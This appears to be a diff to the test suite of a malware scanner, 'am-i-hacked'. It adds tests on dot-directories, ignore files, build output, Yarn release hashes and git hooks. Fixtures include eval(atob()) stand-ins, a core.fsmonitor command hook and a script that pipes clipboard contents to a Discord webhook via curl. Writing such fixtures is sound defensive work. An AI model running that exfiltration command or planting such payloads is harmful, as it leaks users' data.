@@ -562,6 +562,21 @@ write_file() {
   assert_success
 }
 
+@test "the scanned repo's .git/config cannot run a command during the scan" {
+  git init -q "$TMP"
+  write_file ".env" 'API_KEY=placeholder'
+  git -C "$TMP" add .env
+  # Set after `git add`, which would run the hook itself.
+  git -C "$TMP" config core.fsmonitor "touch '$TMP.ran'; false"
+  scan
+  if [[ -e "$TMP.ran" ]]; then
+    rm -f "$TMP.ran"
+    fail "core.fsmonitor from the scanned repo ran during the scan"
+  fi
+  assert_failure
+  assert_output --partial "Tracked .env file"
+}
+
 # -------------------------------------------------------------------------------
 # Long source lines
 # -------------------------------------------------------------------------------
@@ -602,12 +617,34 @@ write_file() {
   assert_success
 }
 
-@test "build output dirs are never scanned" {
-  for d in dist build out coverage .next .turbo .cache .git; do
+@test ".git is never scanned" {
+  write_file ".git/evil.js" 'eval(atob("bad"))'
+  scan
+  assert_success
+}
+
+@test "untracked build output that .gitignore lists is not scanned" {
+  git init -q "$TMP"
+  write_file ".gitignore" 'dist/' 'build/' 'out/' 'coverage/' '.next/' '.turbo/' '.cache/'
+  git -C "$TMP" add .gitignore
+  for d in dist build out coverage .next .turbo .cache; do
     write_file "$d/evil.js" 'eval(atob("bad"))'
   done
   scan
   assert_success
+}
+
+@test "committed build output is scanned" {
+  git init -q "$TMP"
+  write_file ".gitignore" 'dist/'
+  write_file "dist/index.js" 'eval(atob("bad"))'
+  write_file "build/setup.js" 'eval(atob("bad"))'
+  git -C "$TMP" add .gitignore build/setup.js
+  git -C "$TMP" add -f dist/index.js
+  scan
+  assert_failure
+  assert_output --partial "dist/index.js:1"
+  assert_output --partial "build/setup.js:1"
 }
 
 @test "fixtures dir is excluded by default" {
@@ -628,6 +665,95 @@ write_file() {
   write_file "notes.txt" 'eval(atob("bad"))'
   scan
   assert_success
+}
+
+# The repo under review owns its dot-directories and ignore files, so neither
+# may hide a payload from the scan.
+
+@test "source files in dot-directories are scanned" {
+  write_file ".vscode/helper.js" 'eval(atob("bad"))'
+  write_file ".github/scripts/setup.js" 'execSync(cmd)'
+  big="$(printf 'A%.0s' {1..4000})"
+  write_file ".husky/_/run.js" "var x = \"${big}\";"
+  scan
+  assert_failure
+  assert_output --partial ".vscode/helper.js:1"
+  assert_output --partial ".github/scripts/setup.js:1"
+  assert_output --partial ".husky/_/run.js:1"
+}
+
+@test "an extensionless script in a dot-directory is checked for capture and exfiltration" {
+  write_file ".devcontainer/sync-agent" \
+    '#!/bin/bash' \
+    'pbpaste | curl -s "https://discord.com/api/webhooks/123/abc" --data-binary @-'
+  scan
+  assert_failure
+  assert_output --partial ".devcontainer/sync-agent:2"
+}
+
+@test ".ignore and .rgignore files cannot hide a payload" {
+  write_file ".ignore" 'a/'
+  write_file ".rgignore" 'b/'
+  write_file "a/evil.js" 'eval(atob("bad"))'
+  write_file "b/evil.js" 'eval(atob("bad"))'
+  scan
+  assert_failure
+  assert_output --partial "a/evil.js:1"
+  assert_output --partial "b/evil.js:1"
+}
+
+@test "a .gitignore cannot hide a tracked payload" {
+  git init -q "$TMP"
+  write_file ".gitignore" 'lib/' 'sync-agent'
+  write_file "lib/evil.js" 'eval(atob("bad"))'
+  write_file "sync-agent" \
+    '#!/bin/bash' \
+    'pbpaste | curl -s "https://discord.com/api/webhooks/123/abc" --data-binary @-'
+  git -C "$TMP" add .gitignore
+  git -C "$TMP" add -f lib/evil.js sync-agent
+  scan
+  assert_failure
+  assert_output --partial "lib/evil.js:1"
+  assert_output --partial "sync-agent:2"
+}
+
+@test "untracked files that git ignores are not scanned" {
+  git init -q "$TMP"
+  write_file ".gitignore" 'generated/' '.venv/'
+  git -C "$TMP" add .gitignore
+  write_file "generated/bundle.js" 'eval(atob("bad"))'
+  write_file ".venv/lib/site.py" 'eval(atob("bad"))'
+  write_file "src/index.js" 'console.log("hello")'
+  scan
+  assert_success
+}
+
+@test "a tracked payload beside untracked ignored files is still scanned" {
+  git init -q "$TMP"
+  write_file ".gitignore" 'generated/'
+  write_file "generated/bundle.js" 'console.log("built")'
+  write_file "generated/evil.js" 'eval(atob("bad"))'
+  git -C "$TMP" add .gitignore
+  git -C "$TMP" add -f generated/evil.js
+  scan
+  assert_failure
+  assert_output --partial "generated/evil.js:1"
+  assert_output --partial "am-i-hacked: FAILED — 1 finding across 1 file"
+}
+
+@test "tracked ignored files are found under a root path with glob characters" {
+  local root="$TMP/odd [dir] *?"
+  mkdir -p "$root/generated"
+  git init -q "$root"
+  printf '%s\n' 'generated/' >"$root/.gitignore"
+  printf '%s\n' 'eval(atob("bad"))' >"$root/generated/bundle.js"
+  printf '%s\n' 'eval(atob("bad"))' >"$root/generated/evil.js"
+  git -C "$root" add .gitignore
+  git -C "$root" add -f generated/evil.js
+  run bash "$SCRIPT" "$root"
+  assert_failure
+  assert_output --partial "generated/evil.js:1"
+  refute_output --partial "generated/bundle.js"
 }
 
 # -------------------------------------------------------------------------------
@@ -721,7 +847,7 @@ write_file() {
   run --separate-stderr env AIH_PROGRESS=1 bash "$SCRIPT" "$TMP"
   assert_failure 1
   [[ "$stderr" == *"am-i-hacked: scanning"* ]]
-  [[ "$stderr" == *"[19/19]"* ]]
+  [[ "$stderr" == *"[20/20]"* ]]
   [[ "$stderr" == *"1 found"* ]]
   [[ "$output" != *"found so far"* ]]
 }
@@ -921,6 +1047,64 @@ FAKE_TELEGRAM_TOKEN="123456789:$(printf '%035d' 0 | tr 0 A)"
   assert_success
 }
 
+# -------------------------------------------------------------------------------
+# Build-output detection (webpack/esbuild/ncc bundles)
+# -------------------------------------------------------------------------------
+
+@test "build-output with only low-signal patterns is reported but passes" {
+  write_file "dist/index.js" \
+    '/******/ (() => { // webpackBootstrap' \
+    '/******/ var __webpack_modules__ = {' \
+    '/******/ };' \
+    '/******/ function __webpack_require__(moduleId) {' \
+    '/******/   return __webpack_modules__[moduleId].exports;' \
+    '/******/ }' \
+    'const spawn = require("child_process").spawn;' \
+    'const https = require("https");' \
+    'global.x = {};'
+  scan
+  assert_success
+  assert_output --partial "build output, routine matches in bundled code not counted:"
+  assert_output --partial "dist/index.js:"
+  assert_output --partial "matches"
+}
+
+@test "build-output with high-signal pattern fails and is listed as a finding" {
+  write_file "dist/index.js" \
+    '/******/ (() => { // webpackBootstrap' \
+    '/******/ var __webpack_modules__ = {' \
+    '/******/ };' \
+    "const token = \"${FAKE_TELEGRAM_TOKEN}\";" \
+    'fetch("https://api.telegram.org/bot" + token + "/sendMessage", {method:"POST"})'
+  scan
+  assert_failure
+  assert_output --partial "Telegram bot token literal"
+  refute_output --partial "build output, routine matches"
+}
+
+@test "build-output: a marker after byte 4096 is scanned normally" {
+  local big="$(printf 'A%.0s' {1..4100})"
+  write_file "dist/index.js" \
+    "var x = \"${big}\";" \
+    'const __webpack_require__ = function() { eval("x"); };'
+  scan
+  assert_failure
+  assert_output --partial "Dynamic code execution"
+  assert_output --partial "source line exceeds 4000 characters"
+}
+
+@test "build-output: eval in a bundle is tracked but not flagged" {
+  write_file "dist/bundle.js" \
+    '/******/ (() => {' \
+    'const __nccwpck_require__ = () => {};' \
+    'const __toESM = () => { eval("x"); };'
+  scan
+  assert_success
+  assert_output --partial "build output, routine matches in bundled code not counted:"
+  assert_output --partial "dist/bundle.js:"
+  assert_output --partial "am-i-hacked: PASSED"
+}
+
 @test "no false positive: a capture + exfil combo under node_modules is not flagged" {
   write_file "node_modules/evil/clip.js" \
     'const c = require("clipboardy")' \
@@ -954,6 +1138,183 @@ FAKE_TELEGRAM_TOKEN="123456789:$(printf '%035d' 0 | tr 0 A)"
   run env PATH="/usr/bin:/bin:$(dirname "$(command -v rg)")" /bin/bash "$SCRIPT" "$TMP"
   refute_output --partial "invalid option"
   refute_output --partial "declare:"
+}
+
+# -------------------------------------------------------------------------------
+# Real-world repository shapes
+#
+# Synthetic stand-ins for shapes seen in real repositories. No fixture here is a
+# real Yarn release or a real payload: each file is written by the test and only
+# scanned, never executed. The Yarn check reads its hash table from
+# AIH_YARN_RELEASES so tests never touch the shipped bin/yarn-releases.tsv.
+# -------------------------------------------------------------------------------
+
+# sha256_of <file> — the sha256 hex digest, via sha256sum or shasum.
+sha256_of() {
+  if command -v sha256sum >/dev/null 2>&1; then
+    sha256sum "$1" | cut -d' ' -f1
+  else
+    shasum -a 256 "$1" | cut -d' ' -f1
+  fi
+}
+
+@test "yarn release: a hash that is in the table is verified and passes" {
+  big="$(printf 'A%.0s' {1..4001})"
+  write_file ".yarn/releases/yarn-4.0.0.cjs" 'eval(atob("x"))' "var x = \"${big}\";"
+  hash="$(sha256_of "$TMP/.yarn/releases/yarn-4.0.0.cjs")"
+  write_file "yarn-releases.tsv" "4.0.0"$'\t'"${hash}"
+  run env AIH_YARN_RELEASES="$TMP/yarn-releases.tsv" bash "$SCRIPT" "$TMP"
+  assert_success
+  assert_output --partial "verified official Yarn release .yarn/releases/yarn-4.0.0.cjs"
+}
+
+@test "yarn release: one changed byte fails as unknown, with no content findings" {
+  big="$(printf 'A%.0s' {1..4001})"
+  write_file ".yarn/releases/yarn-4.0.0.cjs" 'eval(atob("x"))' "var x = \"${big}\";"
+  hash="$(sha256_of "$TMP/.yarn/releases/yarn-4.0.0.cjs")"
+  write_file "yarn-releases.tsv" "4.0.0"$'\t'"${hash}"
+  printf 'x' >>"$TMP/.yarn/releases/yarn-4.0.0.cjs"
+  run env AIH_YARN_RELEASES="$TMP/yarn-releases.tsv" bash "$SCRIPT" "$TMP"
+  assert_failure
+  assert_output --partial "Yarn release does not match any official Yarn release"
+  assert_equal "$(count_in_output '.yarn/releases/yarn-4.0.0.cjs:')" 1
+  refute_output --partial "source line exceeds"
+  refute_output --partial "Dynamic code execution"
+}
+
+@test "yarn release: a release file with an empty table fails" {
+  big="$(printf 'A%.0s' {1..4001})"
+  write_file ".yarn/releases/yarn-4.0.0.cjs" 'eval(atob("x"))' "var x = \"${big}\";"
+  write_file "yarn-releases.tsv" ""
+  run env AIH_YARN_RELEASES="$TMP/yarn-releases.tsv" bash "$SCRIPT" "$TMP"
+  assert_failure
+  assert_output --partial "Yarn release does not match any official Yarn release"
+}
+
+@test "yarn release: a missing table fails closed and names the table path" {
+  big="$(printf 'A%.0s' {1..4001})"
+  write_file ".yarn/releases/yarn-4.0.0.cjs" 'eval(atob("x"))' "var x = \"${big}\";"
+  run --separate-stderr env AIH_YARN_RELEASES="$TMP/missing-yarn-releases.tsv" bash "$SCRIPT" "$TMP"
+  assert_failure
+  [[ "${output}${stderr}" == *"missing-yarn-releases.tsv"* ]]
+  assert_output --partial "Yarn release does not match any official Yarn release"
+}
+
+@test "yarn release: a verified release does not hide a payload elsewhere" {
+  big="$(printf 'A%.0s' {1..4001})"
+  write_file ".yarn/releases/yarn-4.0.0.cjs" 'eval(atob("x"))' "var x = \"${big}\";"
+  hash="$(sha256_of "$TMP/.yarn/releases/yarn-4.0.0.cjs")"
+  write_file "yarn-releases.tsv" "4.0.0"$'\t'"${hash}"
+  write_file "src/evil.js" 'eval(atob("x"))'
+  run env AIH_YARN_RELEASES="$TMP/yarn-releases.tsv" bash "$SCRIPT" "$TMP"
+  assert_failure
+  assert_output --partial "src/evil.js:1"
+  assert_output --partial "verified official Yarn release .yarn/releases/yarn-4.0.0.cjs"
+  assert_output --partial "am-i-hacked: FAILED — 1 finding across 1 file"
+}
+
+@test "pnp wasm: an embedded octet-stream wasm data URL is exempt from the long-line check" {
+  b64="AGFzbQ$(printf 'A%.0s' {1..4994})"
+  write_file ".pnp.cjs" "var wasmBinaryFile = \"data:application/octet-stream;base64,${b64}\";"
+  scan
+  assert_success
+}
+
+@test "pnp wasm: appending ;eval(x) to the wasm line is not exempt" {
+  b64="AGFzbQ$(printf 'A%.0s' {1..4994})"
+  write_file ".pnp.cjs" "var wasmBinaryFile = \"data:application/octet-stream;base64,${b64}\";eval(x)"
+  scan
+  assert_failure
+  assert_output --partial "source line exceeds 4000 characters"
+}
+
+@test "long line: a text/javascript data URL is not a wasm exemption" {
+  b64="$(printf 'A%.0s' {1..5000})"
+  write_file "bundle.js" "var p = \"data:text/javascript;base64,${b64}\";"
+  scan
+  assert_failure
+  assert_output --partial "source line exceeds 4000 characters"
+}
+
+@test "node-modules repo: a plain Yarn setup with an untracked node_modules passes" {
+  write_file ".yarnrc.yml" 'nodeLinker: node-modules'
+  write_file "package.json" '{ "scripts": { "build": "tsc", "test": "vitest run" } }'
+  write_file "node_modules/evil/index.js" 'eval(atob("x"))'
+  scan
+  assert_success
+}
+
+@test "husky v9 repo: a tracked hook beside an untracked ignored .husky/_ passes" {
+  git init -q "$TMP"
+  write_file ".gitignore" '.husky/_/'
+  write_file ".husky/pre-commit" 'pnpm exec lint-staged'
+  write_file ".husky/_/husky.sh" 'eval(atob("x"))'
+  git -C "$TMP" add .gitignore
+  scan
+  assert_success
+}
+
+@test "vscode extension repo: an npm watch build task and launch.json pass" {
+  write_file ".vscode/tasks.json" \
+    '{"version":"2.0.0","tasks":[{"type":"npm","script":"watch","problemMatcher":"$tsc-watch","group":{"kind":"build","isDefault":true}}]}'
+  write_file ".vscode/launch.json" \
+    '{"version":"0.2.0","configurations":[{"name":"Run Extension","type":"extensionHost","request":"launch","args":["--extensionDevelopmentPath=${workspaceFolder}"]}]}'
+  scan
+  assert_success
+}
+
+@test "devcontainer repo: a postCreateCommand that runs pnpm install passes" {
+  write_file ".devcontainer/devcontainer.json" \
+    '{"image":"mcr.microsoft.com/devcontainers/base:debian","postCreateCommand":"pnpm install"}'
+  scan
+  assert_success
+}
+
+@test "release script: execFileSync with a literal command and options object passes" {
+  write_file ".github/scripts/release.js" \
+    'const { execFileSync } = require("child_process");' \
+    'execFileSync("git", ["tag"], { stdio: "inherit" });'
+  scan
+  assert_success
+}
+
+@test "python repo: a plain noxfile passes while an untracked ignored venv is skipped" {
+  git init -q "$TMP"
+  write_file ".gitignore" '.venv/'
+  write_file "pyproject.toml" '[project]' 'name = "example"' 'version = "0.1.0"'
+  write_file "noxfile.py" \
+    'import nox' \
+    '' \
+    '@nox.session' \
+    'def tests(session):' \
+    '    session.run("pytest", "-q")'
+  write_file ".venv/lib/site.py" 'eval(atob("x"))'
+  git -C "$TMP" add .gitignore pyproject.toml noxfile.py
+  scan
+  assert_success
+}
+
+@test "next.js repo: untracked ignored build output is skipped" {
+  git init -q "$TMP"
+  write_file ".gitignore" '.next/'
+  big="$(printf 'A%.0s' {1..5000})"
+  write_file ".next/server/app.js" "var x = \"${big}\";"
+  git -C "$TMP" add .gitignore
+  scan
+  assert_success
+}
+
+@test "next.js repo: force-added build output is scanned" {
+  git init -q "$TMP"
+  write_file ".gitignore" '.next/'
+  big="$(printf 'A%.0s' {1..5000})"
+  write_file ".next/server/app.js" "var x = \"${big}\";"
+  git -C "$TMP" add .gitignore
+  git -C "$TMP" add -f .next/server/app.js
+  scan
+  assert_failure
+  assert_output --partial ".next/server/app.js:1"
+  assert_output --partial "source line exceeds 4000 characters"
 }
 
 # --- pending: known gaps, deliberately not in this release ----------------------------------------
